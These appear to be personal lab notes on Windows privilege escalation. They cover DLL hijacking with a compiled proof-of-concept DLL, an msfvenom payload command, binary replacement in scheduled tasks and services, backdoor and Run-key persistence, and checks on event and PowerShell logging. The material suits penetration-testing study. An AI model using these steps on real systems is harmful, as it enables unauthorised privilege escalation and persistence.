Windows Access Control Model
  - Access tokens -- users 
      - Roles
      - Permissions
      - Rights
  - Security Descriptors - Files
      - DACL: Discretionary Access Control List 
  - Rules on the file
  
    - SACL: System Access Control List 
        - auditing on the file
    - ACES: Access Controls Entries
        - Entries of what to audit on the file inside of the SACl
DLL SEARCH ORDER
      - executables check the following locations
          - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
            
          - The directory the the Application was run from

          - The Directory specified in the C+ function GetSystemDirectory()
          
          - The Directory specified in the C+ function GetWindowsDirectory 
          
          - The current Directory 
          
WIN PRIV ESC
    1) SCHEDULED TASKS (cron)
    - Binary replacement
    - DLL hijacking
    2) Services
        - Binary replacement
        - DLL hijacking
    Binary Replacement 
        - replacing the legitimate binary with a malicious one
        
    DLL hijacking 
        - Replacing the legitimate DLL that the binary i calling out to with a malicious DLL 
CHECKING UAC SETTINGS 
    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    - EnableLUA REG_DWORD 0x1
AUTOELEVATE EXECUTABLES
    - asInvoker
    - highestAvailabe
    - asAdministrator
    - FOR UAC 
AUTOElevate: TRue or N/A
EventViewer: runs as highest available
    - Autoelevate is set to true
    net use * \\live.sysinternal.com\tools
sigcheck.exe -m <file_path_of_executable> | findstr /i level
sigcheck.exe -m <file_path_of_executable> | findstr /i AutoElevate

*** SCHED TASKS SETUP DEMO ***
   1) Create the scheduled tasks
      - schtasks /create /TN Putty  /TR "C:\Putty\Putty.exe" /RU SYSTEM /SC onlogon
   2) create the directory called putty in the following location 
      - C:\Putty 
   3) download v. 0.67 of Putty and palce inside C:|Putty directory
        - https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html
        putty.exe (the SSH and Telnet client itself)
        - 32-bit: putty.exe
   schtasks /query /fo LIST /v
   
   
   SChedule tasks
 1) Determine Conditions
   General Tabs
      - Security options: System
   Trigger tab 
      - TRigger: At logon
      - Status : enabled
   Actions tab 
      - action C:\Putty\Putty.exe
 2) Determine if we have write permissions at the location 
      - so in this case the C:\Putty folder/directory
      - attempt to create a file inside the directory
 3) perform actions
    - binary replacement
        a) replace legitimate binary with malicious binary
        b) be sure the malicious binary has the same name that the actions tab is calling upon
        
        
        
        http://105.0.35.67/uploads
    - DLL hijacking 
      a) find dlls that the sched tasks use 
            - use procmon and run the exe 
        - procmon filters to find DLLs that putty.exe is using
        - process name - contains - putty - include
        - result - contains - NOT - include 
        - Path - Cotains - .dll - Include
      b) create C SOurce FIle and COmpile into DLL 
          - Install tools on linux machine
          - sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y

          
          
          ####### SSPICLI.C ######### 
        #include <windows.h>
        int execCommand()
        {
          WinExec("cmd /C whoami > FINDME_1.txt", 1);
          return 0;
        }
          BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
        {
          execCommand();
          return 0;
          }
    WAYS WE CAN ESCALATE OUR PIVILEGES 
      - created user, added that user to both remote desktop users and admins
      - add existing users to privilege groups
      - establish persistence by creating backdoors
    CONSIDERATIONS
    \ = to escape characters 
    
    #Compile the raw C source code into a unlinked c object
i686-w64-mingw32-g++ -c SSPICLI.c -o SSPICLI.o

#Create the DLL from unlinked c object
i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
        
 msfvenom -p windows/x64/exec CMD="whoami > C:\\Users\\Public\\Documents\\findme.txt" -f dll        
         ls SSPICLI*
    - ENSURE THAT WE HAVE THE DLL
   TRANSFER FILE INFOMRATION, 
   - scp 
   - python http server
   - base64 
   
         
         
 4) reboot / log on / log back in
    - shutdown /r /f /t 00
 Services BINARY REPLACEMENT    
 1) Determine the conditions
    - Log on as
    - startup type
    - description: blank ( THird party service) 
        - usually third party software are installed in non standard windows directories
    C:\windows
    C:\windows\system32
    right click _> properties // Path to executable C:\putty\putty.exe -- servicee
 2) Determine vulernable directory (if we have write permissions
    go to directory and attempt to write a file
 3) Perform actions
    Binary Replacement
      a) replace legitimate binary with malicious one
      
      b) ensure malciious binary has the same name as the one the windows service is calling for 
      
      http://10.50.35.61/uploads
      file explorer > view > 
      [X] file name extensions
      [X] hidden items
    DLL HIJACKING
 4)Reboot
        
OTHER VULNERABILITIES
    - Unpatched Kernel vulnerabilities
    - Unpatched Systems
    - Unpatched Applications
UAC BYPASS
    - access to a admin account ina  non privileged shell
REGISTRY
    FOR PERSISTENCE
    ALWAYS LOOK TO PUT THEM IN RUN, AND RUN ONCE, IN BOTH HKLM, AND HKCU
wevtutil is cracked
    - qe - query eventsf rom log or log file
    - wevtutil qe security /f:text 
    - use /? after the specified log to show more options, also redirect to text file to ctrl+f the result
auditpol /get /category:*

important event ids
    - 4624/4625 successful/failed login

    - 4720 account created

    - 4672 administrator equivalent user logs on

    - 7045 Service creation
wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
Get-Eventlog -List
Storage: c:\windows\system32\config\ FileType: .evtx/.evt

powershell can be set to log sessions 
2.0 little evidence == nothing about what was executed
3.0 module logging (EventID 4103)
4.0 module logging 
5.0 can set module, script block (EvnetID 4104 and transcription) 

DETERMINE PS VERSION
reg query hklm\software\microsoft\powershell\3\powershellengine\

powershell -command "$psversiontable"

DETERMINE IF LOGGING IS SET ( PS AND WMIC) 

reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell

reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
    # 0 = no | 1 = errors | 2 = verbose
    
    
WMIC Log Storage:

%systemroot%\system32\wbem\Logs\``
